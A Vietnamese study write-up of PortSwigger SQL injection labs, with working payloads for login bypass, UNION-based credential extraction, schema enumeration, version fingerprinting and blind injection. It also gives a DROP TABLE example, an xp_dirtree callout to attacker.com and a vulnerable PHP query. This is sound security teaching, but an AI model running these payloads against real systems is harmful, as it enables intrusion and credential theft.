# LỖ HỔNG SQL INJECTION (PORTSWIGGER)

---

## 1. SQL injection là gì?

- SQL Injection (SQLi) là một lỗ hổng bảo mật cho phép kẻ tấn công chèn (inject) mã SQL độc hại vào câu truy vấn của ứng dụng để:

  - Truy xuất dữ liệu không được phép

  - Thay đổi, chèn, hoặc xóa dữ liệu

  - Thực hiện các hành vi khác như lấy tài khoản admin, RCE (trong một số trường hợp nâng cao.

- Về bản chất của lỗ hổng SQLi: Khi ứng dụng web nhận input từ người dùng và nhúng trực tiếp vào câu truy vấn SQL mà không kiểm tra hoặc lọc kỹ, hacker có thể thêm đoạn mã SQL độc hại để thao túng truy vấn.

- Ví dụ giả sử đoạn code phía backend xử lý login như sau (PHP + MySQL):

```php
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

- Nếu người dùng nhập:

```bash
username: admin
password: ' OR '1'='1
```

- Câu truy vấn sẽ trở thành:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```

&rarr;  OR '1'='1' luôn đúng → Hacker đăng nhập được không cần mật khẩu.

---

## 2. Cách phát hiện lỗ hổng SQL injection

- **Dùng ký tự dấu nháy đơn ' để tìm lỗi**: Đây là một ký tự đặc biệt trong SQL, dùng để bao quanh giá trị dạng chuỗi. Nếu ứng dụng không xử lý đúng input này, nó sẽ làm câu lệnh SQL bị lỗi cú pháp, dẫn đến báo lỗi từ cơ sở dữ liệu.
  
  Giả sử ta có đoạn query bên trong web:

  ```sql
  SELECT * FROM users WHERE username = '$input';
  ```

  Khi người dùng nhập: admin &rarr; câu query trở thành:

  ```sql
  SELECT * FROM users WHERE username = 'admin'';
  ```

  &rarr; Nếu web trả lại lỗi từ SQL (như "syntax error" hoặc "unclosed quotation mark"), có thể tồn tại SQL injection.

- **Dùng điều kiện Boolean (OR 1=1, OR 1=2) để phân biệt**: Dùng những biểu thức đúng/sai trong SQL để kiểm tra phản hồi có thay đổi hay không.

  Giả sử form login có SQL:

  ```sql
  SELECT * FROM users WHERE username = '$user' AND password = '$pass';
  ```

  Khi nhập: user = admin' OR 1=1 -- → câu lệnh trở thành:

  ```sql
  SELECT * FROM users WHERE username = 'admin' OR 1=1 -- ' AND password = 'abc';
  ```

  Do 1=1 luôn đúng, câu lệnh trả về tất cả người dùng → có thể login mà không cần mật khẩu.

- **Dùng payload gây delay (Time-based Blind SQLi)**: Khi ứng dụng không hiển thị lỗi hay khác biệt về nội dung, ta thử gây chậm phản hồi bằng SQL. Nếu server chậm phản hồi đúng như thời gian delay → có thể bị SQLi.

  Ví dụ với MySQL:

  ```sql
  admin' AND SLEEP(5) --
  ```

  Nếu server mất khoảng 5 giây mới trả lời → xác nhận SQL injection tồn tại.

- **OAST payloads (Out-Of-Band Application Security Testing)**: Payload SQL được thiết kế để kích hoạt truy cập mạng đến một máy chủ. Nếu thấy có yêu cầu đến server bạn kiểm soát, thì lỗ hổng tồn tại.

  Ví dụ: với SQL Server, dùng:

  ```sql
  '; exec xp_dirtree('\\attacker.com\test') --
  ```

  → Nếu server gửi truy vấn DNS đến attacker.com, ta biết SQLi đã thực thi.

- Ngoài ra, SQLi có thể tồn tại trong bất ký vị trí nào trong câu truy vấn, và trong nhiều kiểu truy vấn khác nhau: WHERE, UPDATE, INSERT, ORDER BY, ...

  Ví dụ:

  ```sql
  INSERT INTO feedback (comment) VALUES ('$input');
  ```

  Nếu *$input = abcxyz'); DROP TABLE users; --,* thì truy vấn thành:

  ```sql
  INSERT INTO feedback (comment) VALUES ('abcxyz'); DROP TABLE users; --');
  ```

  &rarr; Đây là một chuỗi truy vấn nhiều câu lệnh (multi-statement) → Bảng users bị xóa.

---

## 3. Trích xuất dữ liệu ẩn

- Giả sử trên một trang web, user chọn một danh mục ABC và trình duyeejh sẽ gửi yêu cầu như:

  ```url
  https://website.com/products?category=ABC
  ```

  Lúc đó, ứng dụng web sẽ sử dụng giá trị "ABC" để tạo ra một truy vấn SQL như sau:

  ```sql
  SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
  ```

  với *AND released = 1* chỉ hiển thị các sản phẩm đã được "phát hành" (có thể bán). Do đó khi attacker muốn xem cả các sản phẩm chưa phát hành, tức là released = 0. Ta có thể chèn        thêm vào URL để điều chỉnh câu lệnh SQL như:

  ```url
  https://website.com/products?category=ABC' OR 1=1 -- 
  ```

  Tạo ra câu truy vấn:

  ```sql
  SELECT * FROM products WHERE category = 'ABC' OR 1=1-- ' AND released = 1;
  ```

  &rarr; OR 1=1 luôn đúng, -- ký hiệu comment → tất cả phần sau -- đều bị bỏ qua và câu *AND released = 1* không còn hiệu lực.

  ⇒ Truy vấn trả về tất cả sản phẩm trong bảng products kể cả không phát hành.

  ⇒ Dữ liệu bị ẩn đã bị lộ.

### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

- Với cách thức như vậy, ta thử khai thác với website có các option danh mục như sau:

  <img width="1919" height="872" alt="image" src="https://github.com/user-attachments/assets/90ebd16a-34ee-432d-bc8e-23d4ee4caa90" />

  Ta chọn danh mục Accesstories, lúc này burp suite bắt được request của trình duyệt:

  <img width="1405" height="697" alt="image" src="https://github.com/user-attachments/assets/dea47a0d-7ca1-4f5e-acc7-40db8d082d34" />

  Sử dụng Repeater để gửi lại request đó như sau:

  ```bash
  GET /filter?category=Accessories' OR 1=1 --
  ```

  Lúc này câu truy vấn được xử lý sẽ trở thành:

  ```sql
  SELECT * FROM products WHERE category = 'Accessories' OR 1=1 --' AND released = 1;
  ```  

  Kết quả thành công, ta sẽ thấy website trả về tất cả các sản phẩm:

  <img width="1839" height="744" alt="image" src="https://github.com/user-attachments/assets/79709f76-6cd3-4d85-8548-3105d3419a31" />

---

## 4. Sai logic xử lý của ứng dụng

- SQLi cũng có thể tổn tại trong form đăng nhập của website. Giả sử user điền "ngoctai" và "password", lúc này ứng dụng sẽ tạo ra câu truy vấn:

  ```sql
  SELECT * FROM users WHERE username = 'ngoctai' AND password = 'password'
  ```

  Tuy nhiên, nếu hacker nhập: *username = admin' --* và password là bất kỳ.

  Lúc này câu SQL sinh ra là:

  ```sql
  SELECT * FROM users WHERE username = 'admin' --' AND password = ''
  ```

  &rarr; Kết quả --' sẽ làm mọi câu sau nó bị bỏ qua, phần *AND password = ''* bị vô hiệu hóa &rarr; Đăng nhập thành công dù không biết mật khẩu.

### Lab: SQL injection vulnerability allowing login bypass

- Với cách thức như vậy, ta thử khai thác một form login như sau:

  <img width="1916" height="872" alt="image" src="https://github.com/user-attachments/assets/0ba5fba3-2c1d-4cda-9906-86004568ea5f" />

  Kiểm tra request gửi thông tin username và password trên burp suite:

  <img width="1415" height="760" alt="image" src="https://github.com/user-attachments/assets/fed945bf-86ac-499e-8cff-affc4036e742" />

  Nhập nội dung username như bên dưới:

  <img width="1919" height="874" alt="image" src="https://github.com/user-attachments/assets/408d139d-8cd8-45f1-821f-ed12f58928c0" />

  Lúc này, câu SQL trở thành:

  ```sql
  SELECT * FROM users WHERE username = 'admin' --' AND password = '123'
  ```

  Kết quả bypass thành công:

  <img width="1919" height="875" alt="image" src="https://github.com/user-attachments/assets/e55f43a0-c435-44b6-aff2-e842ac1d27d2" />

---

## 5. SQL injection UNION attacks

- Câu lệnh UNION trong SQL dùng để kết hợp kết quả của 2 hoặc nhiều câu lệnh SELECT thành một tập kết quả duy nhất. Giống như phép hợp trong toán học.

  Cú pháp lệnh UNION như sau:

  ```bash
  SELECT column1, column2 FROM table1
  UNION
  SELECT column1, column2 FROM table2;
  ```

  Để thực hiện được lợi dụng lệnh UNION, ta cần phải biết hoặc đoán đúng số cột và kiểu dữ liệu trong câu truy vấn gốc. Bởi vì giả sử nếu câu truy vấn gốc select hai cột hợp (union) với   câu truy vấn 1 hoặc 3 cột thì kết quả trả về sẽ lỗi vì không đồng nhất kết quả dữ liệu, do đó mà không thể hiển thị ra giao diện.

  Ví dụ với một URL như sau:

  ```url
  http://website.com/products.php?id=5
  ```

  Phía server thực hiện truy vấn:

  ```sql
  SELECT name, price FROM products WHERE id = 5;
  ```

  Trong trường hợp nếu ta có thể chèn thêm câu lệnh UNION vào URL như sau:

  ```url
  http://website.com/products.php?id=5 UNION SELECT username, password FROM users
  ```

  Câu truy vấn sẽ trở thành:

  ```sql
  SELECT name, price FROM products WHERE id = 5
  UNION
  SELECT username, password FROM users;
  ```

  &rarr; Kết quả ta sẽ thấy cột username và password từ bảng users hiển thị ra trang web.

---

## 6. Xác định số lượng cột

- Như đã nói ở mục trước, khi muốn sử dụng UNION SELECT để trích xuất dữ liệu từ bảng khác, thì số lượng cột trong truy vấn gốc và truy vấn bạn chèn vào phải bằng nhau.

- Một phương pháp để xác định là sử dụng mệnh đề *ORDER BY*, lệnh này được sử dụng để sắp xếp kết quả truy vấn (query results) theo một hoặc nhiều cột.

- Với *ORDER BY <index>* sẽ thực hiện sắp xếp kết quả theo vị trí cột được chỉ định trong câu lệnh SELECT.

- Ví dụ:

  ```sql
  SELECT name, age, gpa
  FROM students
  ORDER BY 2;  -- tức là sắp xếp theo cột thứ 2 là 'age'
  ```

  &rarr; Nếu ta chỉ định một số lớn hơn số lượng cột thực tế, SQL sẽ báo lỗi. Do đó có thể lợi dụng điều này để khai thác xác định số lượng cột.

- Giả sử ta thực hiện lần lượt tạo các tham số id trong URL như sau:

  ```url
  http://example.com/product?id=1' ORDER BY 1-- 
  http://example.com/product?id=1' ORDER BY 2-- 
  http://example.com/product?id=1' ORDER BY 3-- 
  ...
  ```

  Mỗi payload sẽ được tạo một câu truy vấn như sau:

  ```sql
  SELECT name, description FROM products WHERE id='1' ORDER BY 1-- 
  ```

  Do đó khi ta tăng dần số lượng:

  ```bash
  ' ORDER BY 1-- → OK 

  ' ORDER BY 2-- → OK 

  ' ORDER BY 3-- → Lỗi (vì bảng chỉ có 2 cột)
  ```

  &rarr; Kết luận câu truy vấn gốc thực hiện truy vấn hai cột.

- Một phương pháp khác là sử dụng *UNION SELECT NULL*, bản chất là gửi các payload UNION SELECT với số lượng NULL khác nhau cho đến khi bạn không gặp lỗi, nghĩa là bạn đã khớp được số lượng cột của truy vấn gốc. Bởi vì NULL là không có kiểu dữ liệu cụ thể, nên nó tương thích với mọi loại cột.

- Nên ta có thể tạo các tham số id như sau:

  ```bash
  ?id=1' UNION SELECT NULL-- -
  ?id=1' UNION SELECT NULL,NULL-- -
  ?id=1' UNION SELECT NULL,NULL,NULL-- -
  ...
  ```

  Nếu số lượng NULL không khớp số lượng cột ở câu truy vấn gốc, database có thể bảo lỗi hoặc ứng dụng sẽ trả lỗi HTTP.

### Lab: SQL injection UNION attack, determining the number of columns returned by the query

- Giao diện một trang web cho phép xem các sản phẩm:

  <img width="1919" height="872" alt="image" src="https://github.com/user-attachments/assets/7255319c-0123-4031-b08f-c6a8c988885a" />

  Request của trình duyệt khi ta chọn một category là Food & Drink:

  <img width="1400" height="806" alt="image" src="https://github.com/user-attachments/assets/1f854e05-f498-4efc-9c46-cff0a7d26ef8" />

  Thực hiện gửi request vào Repeater sau đó sửa tham số category lần lượt như:

  ```url
  GET /filter?category=Food+%26+Drink' ORDER BY 3 --
  GET /filter?category=Food+%26+Drink' ORDER BY 4 --
  ```

  Kết quả khi *ORDER BY 3* vẫn hợp lệ:

  <img width="1869" height="751" alt="image" src="https://github.com/user-attachments/assets/4371588f-27de-479f-a0be-7486f734dbc9" />

  Tuy nhiên với *ORDER BY 4* kết quả trả về là internal server error:

  <img width="1870" height="745" alt="image" src="https://github.com/user-attachments/assets/e012d860-bf25-49e2-80e8-0f076824355a" />

  &rarr; Kết luận câu truy vấn gốc có 3 cột.

  Khi đó câu truy vấn lúc này sẽ trở thành:

  ```sql
  SELECT a, b, c FROM products WHERE category='Food & Drink' ORDER BY 4 -- 
  ```

  và sẽ xảy ra lỗi khi 4 vượt quá lượng cột chỉ định.

- Với cách sử dụng UNION SELECT NULL:

  Tạo payload với số lượng hai null:

  <img width="1869" height="745" alt="image" src="https://github.com/user-attachments/assets/d65ea8dc-5e60-4d02-9d1f-0f4cf4426096" />

  &rarr; Kết quả báo lỗi.

  Tạo payload với số lượng ba null thì hợp lệ:

  <img width="1866" height="753" alt="image" src="https://github.com/user-attachments/assets/11ccad0e-be95-444f-864e-2c30964c318b" />

  Vì lúc này câu truy vấn UNION SELECT sẽ đủ điều kiện hợp ba cột của truy vấn gốc với ba cột NULL:

   ```sql
  SELECT a, b, c FROM products WHERE category='Food & Drink' UNION SELECT NULL, NULL, NULL -- 
  ```

**Note**: Đối với DBMS như Oracle, nó yêu cầu mọi truy vấn SELECT phải có mệnh đề FROM. Do đó mà có bảng hệ thống đặc biệt tên là DUAL – một bảng chỉ có 1 dòng, 1 cột, dùng để “giả lập” truy vấn. ví dụ: ***' UNION SELECT NULL FROM DUAL--***

---

## 7. Tìm ra cột có kiểu dữ liệu phù hợp

- Khi thực hiện tấn công kiểu *UNINON SELECT* , nếu cột nào không tương thích kiểu dữ liệu (ví dụ kiểu int) sẽ gây lỗi khi bạn cố gán chuỗi vào nó.

- Do đó giả sử đã biết truy vấn gốc có 4 cột, ta chèn lần lượt thử chuỗi bất kỳ 'any' vào từng vị trí để xem phản hồi của server.

  ```sql
  ' UNION SELECT 'any', NULL, NULL, NULL--  
  ' UNION SELECT NULL, 'any', NULL, NULL--  
  ' UNION SELECT NULL, NULL, 'any', NULL--  
  ' UNION SELECT NULL, NULL, NULL, 'any'--
  ```

  Nếu server trả lỗi: "Conversion failed when converting the varchar value 'any' to data type int" &rarr; Cột đó không tương thích với kiểu chuỗi, bỏ qua.

  Nếu server không báo lỗi &rarr; Đó là cột có kiểu string và đang được in ra.

### Lab: SQL injection UNION attack, finding a column containing text

- Giao diện trang web thực hiện khai thác:

  <img width="1875" height="885" alt="image" src="https://github.com/user-attachments/assets/81915abe-8af3-4608-846e-dd9e865a942e" />

  Tương tự bắt request category vào trong Repeater để xác định số lượng cột trong truy vấn gốc.

  Ta thấy với *ORDER BY 4* server trả về lỗi &rarr; câu truy vấn gốc có 3 cột.

  <img width="1872" height="811" alt="image" src="https://github.com/user-attachments/assets/20173be6-7742-43e9-8ac6-04b3d1da04ad" />

  Tạo các payload:

  ```sql
  ' UNION SELECT '8Dx9Oj', NULL, NULL--  
  ' UNION SELECT NULL, '8Dx9Oj', NULL--  
  ' UNION SELECT NULL, NULL, '8Dx9Oj'--  
  ```

  Ta thấy với: *' UNION SELECT NULL, '8Dx9Oj', NULL--* kết quả trả về hợp lệ &rarr; cột thứ hai có kiểu dữ liệu chuỗi.

  <img width="1866" height="746" alt="image" src="https://github.com/user-attachments/assets/d8df1350-260f-4a24-b65b-833e74b82832" />

  Lúc này câu truy vấn sẽ là:

  ```sql
  SELECT a, b, c FROM products WHERE category='Gifts' UNION SELECT NULL, '8Dx9Oj', NULL --
  ```

  Do cột *b* có dữ liệu string nên hợp lệ với kết quả hợp '8Dx9Oj'.
  
---

## 8. Sử dụng SQLi UNION attacks để thu thập thông tin.

- Như đã trình bày trong các mục trước, ta có thể sử dụng câu lệnh UNION SELECT để kết hợp với câu truy vấn gốc để lấy những dữ liệu hữu ích.

- Ví dụ, ta có thể tạo payload *' UNION SELECT username, password FROM users--* để thu thập thông tin đăng nhập người đùng, câu truy vấn lúc này có thể:

  ```sql
  SELECT col1, col2 FROM products WHERE name = '' UNION SELECT username, password FROM users--'
  ```

- Một vấn đề khác đặt ra là làm thế nào để lấy được thông tin các tên bảng cũng như tên cột. Do đó mà khi ta không biết cấu trúc dữ liệu của hệ thống, ta có thể dò bằng cách sử dụng truy vấn bảng hệ thống như: *information_schema.tables, information_schema.columns*

- Ví dụ:

  ```sql
  ' UNION SELECT table_name, NULL FROM information_schema.tables--
  ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
  ```

### Lab: SQL injection UNION attack, retrieving data from other tables

- Giao diện trang web ta thực hiện khai thác:

  <img width="1919" height="878" alt="image" src="https://github.com/user-attachments/assets/893c8600-a612-4403-a683-920d9e651a0b" />

  Gửi request category Pets vào trong Repeater:

  <img width="1429" height="807" alt="image" src="https://github.com/user-attachments/assets/7ad1688b-aad5-47f5-8720-d011c3e81c93" />

  Xác định được câu truy vấn gốc category có hai côt:

  <img width="1428" height="788" alt="image" src="https://github.com/user-attachments/assets/3abe3e45-d66d-46c3-a9ed-d51299bd2356" />

  Tạo payload lấy thông tin các bảng có tròng CSDL hệ thống:

  ```bash
  GET /filter?category=Pets' UNION SELECT table_name, NULL FROM information_schema.tables --
  ```

  Câu truy vấn lúc này là:

  ```sql
  SELECT a, b FROM products WHERE category='Pets' UNION SELECT table_name, NULL FROM information_schema.tables --'
  ```

  <img width="1873" height="748" alt="image" src="https://github.com/user-attachments/assets/c5b3ddea-157b-4529-88f9-7800e4b4e00a" />

  &rarr; Từ đây ta xác định được CSDL có bảng users.

  Tạo payload lấy thông tin các tên cột có tròng bảng users đã xác định trước đó:

  ```bash
  GET /filter?category=Pets' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
  ```
  
  <img width="1874" height="739" alt="image" src="https://github.com/user-attachments/assets/f1c9ea74-d179-4fe7-96e8-6d07063e7025" />

  &rarr; Phát hiện có hai cột là username và password.

  Thực hiện tạo payload như sau để lấy thông tin đăng nhập:

  ```bash
  GET /filter?category=Pets' UNION SELECT username, password from users --
  ```

  Câu truy vấn lúc này sẽ là:

  ```sql
  SELECT a, b FROM products WHERE category='Pets' UNION SELECT username, password from users --'
  ```

  <img width="1867" height="752" alt="image" src="https://github.com/user-attachments/assets/6781822d-34b8-4a08-9180-1ca2f3ab1cf1" />

  &rarr; Kết quả trả về của câu truy vấn UNION SELECT. Lấy thành công thông tin đăng nhập.

  Đăng nhập thành công tài khoản administrator với password là 8x3negbkpcm0smzysrh7:

  <img width="1919" height="876" alt="image" src="https://github.com/user-attachments/assets/fd7ef353-a907-4b52-9f13-afcc63357a19" />

---

## 9. Thu thập nhiều trường dữ liệu từ một cột

- Câu hỏi đặt ra lúc này là: Nếu cấu truy vấn gốc chỉ có một cột duy nhất được chỉ định thì làm thế nào để dùng câu lệnh UNION SELECT để lấy nhiều cột dữ liệu?

- Một phương pháp đó là sử dụng nối (concatenate) các giá trị lại thành một chuỗi duy nhất, và chèn một ký tự phân cách giữa chúng (ví dụ ~, : hoặc |) để dễ phân biệt khi hiện thị ra giao diện.

- Ví dụ trong DBMS Oracle:

  Ta dùng toán tử nối chuỗi là ||, giá sử ta chèn payload: *' UNION SELECT username || '~' || password FROM users--* vào trong câu truy vấn gốc sẽ trở thành:

  ```sql
  SELECT a FROM products WHERE category='Pets' UNION SELECT username || '~' || password FROM users --'
  ```

  Lúc này nếu username là admin, password là 123 thì *username || '~' || password* sẽ tạo ra chuỗi kiểu: ***administrator~s3cureusername***

  Dấu '~' để tách riêng hai chuỗi cho dễ phân biệt.

- Ví dụ trong DBMS khác là MySQL:

  Ta sử dụng toán tử nối chuỗi là hàm CONCAT() với cú pháp: CONCAT(string1, string2, ...)

  Câu truy vấn khi chèn sẽ thành:

  ```sql
  SELECT a FROM products WHERE category='Pets' UNION SELECT CONCAT(username, '~', password) FROM users --'
  ```
  
### Lab: SQL injection UNION attack, retrieving multiple values in a single column

- Giao diện web ta thực hiện khai thác:

<img width="1915" height="876" alt="image" src="https://github.com/user-attachments/assets/7d18d4fe-48fa-43a0-a9b6-3fd00218059a" />

- Ta tiếp tục bắt request category "Accessories" vào trong Repeater để thực hiện khai thác.

- Phát hiện câu truy vấn gốc có hai cột:

  <img width="1433" height="757" alt="image" src="https://github.com/user-attachments/assets/762458de-f847-4d40-8ea5-dcb6a59922e8" />

- Phát hiện được cột thứ nhất của câu truy vấn gốc không phải kiểu chuỗi:

  <img width="1432" height="739" alt="image" src="https://github.com/user-attachments/assets/bba686d2-919b-4bd3-9041-427c8c1e1d24" />

  Tuy nhiên cột thứ hai là kiểu dữ liệu chuỗi:

  <img width="1430" height="727" alt="image" src="https://github.com/user-attachments/assets/c5b10a7d-8ee8-4952-9f1b-36382d5501ea" />

  &rarr; Do đó ta có thể lợi dụng cột này để khai thác tiếp.

- Thu thập thông tin tên bảng CSDL và tên cột của bảng:

  <img width="1426" height="742" alt="image" src="https://github.com/user-attachments/assets/32f1efb7-178c-479b-a2de-1440590abfda" />

  <img width="1860" height="736" alt="image" src="https://github.com/user-attachments/assets/089a330c-b0e5-4ac7-a05d-fd70ac3c6ec2" />

- Lúc này ta có thể sử dụng toán tử nối chuỗi của MySQL là hàm CONCAT() như đã đề cập ở trên để thực hiện lấy thông tin đăng nhập:

  ```url
  GET /filter?category=Accessories' UNION SELECT NULL, CONCAT(username, '~', password) FROM users --
  ```

  Câu truy vấn lúc này server sẽ thực hiện là:

  ```sql
  SELECT a, b FROM products WHERE category='Accessories' UNION SELECT NULL, CONCAT(username, '~', password) FROM users --'
  ```

  Kết quả thu được username có *administrator* và password là *s976xd1xtlr37i59byxj*:

  <img width="1872" height="748" alt="image" src="https://github.com/user-attachments/assets/87892bf0-ef47-4cf9-ac4b-e2ad6736f046" />

  Đăng nhập thành công:

  <img width="1895" height="859" alt="image" src="https://github.com/user-attachments/assets/67c09b96-1cf3-4633-b8f7-32f39f103285" />

---

## 10. Kiểm tra, thu thập thông tin CSDL từ SQLi

- Để khai thác SQLi, các thông tin cần thiết về CSDL của hệ thống:

  - Loại và phiên bản của phần mềm CSDL.
 
  - Các bảng và các cột mà CSDL chứa.
 
- Điều này khá quan trọng khi thực hiện SQLi vì mỗi loại DBMS (Database Management System) như MySQL, MSSQL, Oracle, PostgreSQL,... có cú pháp, hàm hệ thống và cách xử lý truy vấn khác nhau.

- Một số truy vấn để lấy version trên các DBMS như sau:

  ```sql
  Microsoft SQL Server: SELECT @@version
  MySQL: SELECT @@version
  Oracle: SELECT * FROM v$version
  PostgreSQL: SELECT version()
  ```

  Ví dụ ta nhập vào ô tìm kiếm payload sau: *' UNION SELECT @@version--*

  Kết quả trả về là:

  ```sql
  Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
  ...
  ```

  &rarr; Xác định được DBMS là Microsoft SQL Server...

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

- Giao diện trang web ta thực hiện khai thác lấy version CSDL:

  <img width="1919" height="880" alt="image" src="https://github.com/user-attachments/assets/40246994-8131-46d9-8275-90dcd3cbb903" />

- Xác định câu truy vấn gốc có hai cột dữ liệu:

  <img width="1875" height="751" alt="image" src="https://github.com/user-attachments/assets/dc80b908-2c46-4045-a6f5-f8f72fb9e93e" />

- Cả hai cột đều có kiểu dữ liệu là dạng chuỗi:

  <img width="1869" height="748" alt="image" src="https://github.com/user-attachments/assets/d7e6ef02-0f02-4e0b-83fc-6b3d3ae1ceb8" />

- Để xác định phiên bản DBMS của hệ thống ta cần tạo payload:

  ```url
  GET /filter?category=Lifestyle' UNION SELECT @@version, null -- -
  ```

  Câu truy vấn lúc này sẽ là:

  ```sql
  SELECT a, b FROM products WHERE category='Lifestyle' UNION SELECT @@version, null -- -'
  ```

  Do câu truy vấn gốc có hai cột nên trong câu lênh UNION SELECT ngoài cột trả về version của database, ta cần thêm tạo thêm một trường NULL. 

  Kết quả trả về là *8.0.42-0ubuntu0.20.04.1*:

  <img width="1869" height="678" alt="image" src="https://github.com/user-attachments/assets/39ab04e7-455b-4a64-b923-5caf1fddd072" />

### Lab: SQL injection attack, listing the database contents on non-Oracle databases

- Giao diện trang web ta thực hiện khai thác lấy thông tin CSDL:

  <img width="1919" height="871" alt="image" src="https://github.com/user-attachments/assets/cb2ef325-a191-4375-be73-f273da61ce17" />

- Xác định truy vấn gốc có hai cột dữ liệu:

  <img width="1862" height="749" alt="image" src="https://github.com/user-attachments/assets/ae136fc0-2f39-4702-92ca-b941a2fc7bcf" />

- Phát hiện cả hai cột đều có kiểu dữ liệu là chuỗi:

  <img width="1875" height="755" alt="image" src="https://github.com/user-attachments/assets/2aa3579b-c4ce-4cf2-8e5f-68f54309cd5c" />

- Xác định được version của DBMS hệ thống đang sử dụng là ***PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4)*** (vì khi sử dụng @@version nên chuyển hướng sang version()):

  <img width="1872" height="749" alt="image" src="https://github.com/user-attachments/assets/ec6ea820-7b61-4bad-85d1-292ce6df3f3e" />

  &rarr; Ta có thể xác định tên bảng cũng như các cột của các bảng đó bằng *information_schema.tables* và *information_schema.columns* vì chỉ có DBMS Oracle không xác định bằng *information_schema*.

- Xác định một table tiềm năng là *users_eeenab* có thể chứa thông tin của các users:

  <img width="1864" height="674" alt="image" src="https://github.com/user-attachments/assets/b1850244-7352-4c00-aec2-eb028852089b" />

- Phát hiện có hai trường là: *username_zfzsqs* và *password_eemzed* trong table *users_eeenab*

  <img width="1864" height="683" alt="image" src="https://github.com/user-attachments/assets/6a57fe8f-9393-4d32-b9b8-1d7485902bd1" />

- Thực hiện tạo payload để tạo câu truy vấn truy xuất dữ liệu từ hai trường trên:

  ```sql
  SELECT a, b FROM products WHERE category='Gifts' UNION SELECT username_zfzsqs, password_eemzed from users_eeenab --'
  ```

  Kết quả thu được username administrator có password là *51c3yky64la6lgiijqw5*:

  <img width="1871" height="750" alt="Screenshot 2025-08-06 143808" src="https://github.com/user-attachments/assets/918069ff-83a5-4336-a4a4-6b77c4f46c8a" />

  Đăng nhập thành công vào user administrator:

  <img width="1906" height="868" alt="image" src="https://github.com/user-attachments/assets/090baab4-f650-4c82-965a-c66f56370a28" />

--- 

## 11. Blind SQL injection

- Đối với kỹ thuật tấn công phổ biến như UNION-based SQLi, vốn dựa vào việc hiển thị dữ liệu truy vấn trên giao diện người dùng.

- Câu hỏi đặt ra nếu việc inject không hiện thị ra giao diện thì làm sao để nhận biết, đây là bản chất của việc sinh ra kỹ thuật Blind SQLi.

**11.1. Boolean-based**
- Một phương pháp có thể dựa vào là suy luận kết quả qua hành vi và trạng thái phản hồi của server trên giao diện trang web.

  Ví dụ trên một trang web có URL truy vấn id của sản phẩm như sau:

  ```url
  http://website.com/product?id=1
  ```

  Server sẽ trả về hai trạng thái là: sản phẩm tồn tại hoặc không tồn tại. Ta có thể dựa vào đây thực hiện tạo câu truy vấn trả về đúng sai.

  Giả sử ta chèn vào tham số id: *' AND 1=1 --*

  Câu truy vấn trở thành:

  ```sql
   SELECT a, b FROM products WHERE id='1' AND 1=1 --'
  ```

  &rarr; Trang vẫn hiển thị sản phẩm id = 1 tồn tại bình thường do AND 1=1 luôn đúng.

  Ngược lại khi tạo câu truy vấn:

  ```sql
  SELECT a, b FROM products WHERE id='1' AND 1=2 --'
  ```

  &rarr; Trang sẽ hiện thị sản phẩm không tồn tại mặc dù có sản phẩm id = 1 trong CSDL vì AND 1=2 luôn sai.
    
  Dựa vào logic như trên, ta có thể tạo ra các payload boolean khác nhau để khai thác CSDL hệ thống.

  Ví dụ với câu truy vấn sau sẽ trả về độ dài của trường password của user:

  ```sql
  (SELECT length(password) FROM users WHERE user_id=1)
  ```

  Ta có thể sử dụng nó để tạo thành payload trả về đúng hoặc sai để đoán được độ dài password của user:

  ```sql
  1’ and (SELECT length(password) FROM users WHERE user_id=1) > <index> --
  ```

  &rarr; Lúc này nếu độ dài password lớn hơn <index> thì phản hồi trả về sản phẩm tồn tại bình thường, nhưng với <index> mà bằng với độ dài password thì sẽ trả về trang thái sản phẩm không tồn tại &rarr; Có thể suy ra <index> lúc này là độ dài của password.

  Ví dụ khác với câu truy vấn sau sử dụng hàm substring() để trả về 1 ký tự ở vị trí 1 trong password:

  ```sql
  SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1)
  ```

  Ta sẽ sử dụng nó để tạo payload để đoán từng ký tự tại các vị trí trong password:

  ```sql
  1' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'a' --
  ```

  &rarr; Nếu ký tự vị trí 1 đúng là ký tự 'a' trang sẽ trả về trạng thái sản phẩm tồn tại bình thường, ngược lại thì đó là ký tự sai và ta sẽ thử các ký khác.

 **Note: Một số DBMS là SUBSTR().**

### Lab: Blind SQL injection with conditional responses

- Giao diện ta thực hiện khai thác boolean-based:

  <img width="1919" height="873" alt="image" src="https://github.com/user-attachments/assets/faa1eb3a-1937-411d-8725-15a0a8707de0" />

  &rarr; Điểm đặc biệt là ta thấy xuất hiện dòng chữ "Welcome back!" khi ta thực hiện ấn vào một category bất kỳ.

- Ta thấy, khi thay đổi tham số category sang một giá trị không có nghĩa hoặc inject SQL thì trạng vẫn trả về giao diện:

  <img width="1871" height="752" alt="image" src="https://github.com/user-attachments/assets/61cace35-3456-470c-9226-44c22c3a525b" />

  &rarr; Không có lỗi SQLi trong tham số này.

- Ta để ý headers HTTP thấy phần giá trị cookie TrackingId, ta thử chèn thêm: *' AND 1=2 --* để kiểm tra SQLi:

  Lúc này server có thể thực hiện truy vấn:

  ```sql
  SELECT TrackingId FROM ABC WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' AND 1=2 --'
  ```

  <img width="1870" height="745" alt="image" src="https://github.com/user-attachments/assets/e952ca10-f1c2-4596-9d2b-18bb68c2260c" />

  &rarr; Nhận thấy dòng chữ "Welcome Back!" biến mất &rarr; Tồn tại lỗ hổng boolean-based SQLi.

  Tạo payload sau để kiểm tra xem hệ thống bảng trong CSDL có bảng users hay không:

  ```sql
  ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0--
  ```

  Kết quả trả về xuất hiện dòng chữ "Welcome Back!":

  <img width="1880" height="744" alt="image" src="https://github.com/user-attachments/assets/223e05d3-3680-4034-a2dc-755869aa57a1" />

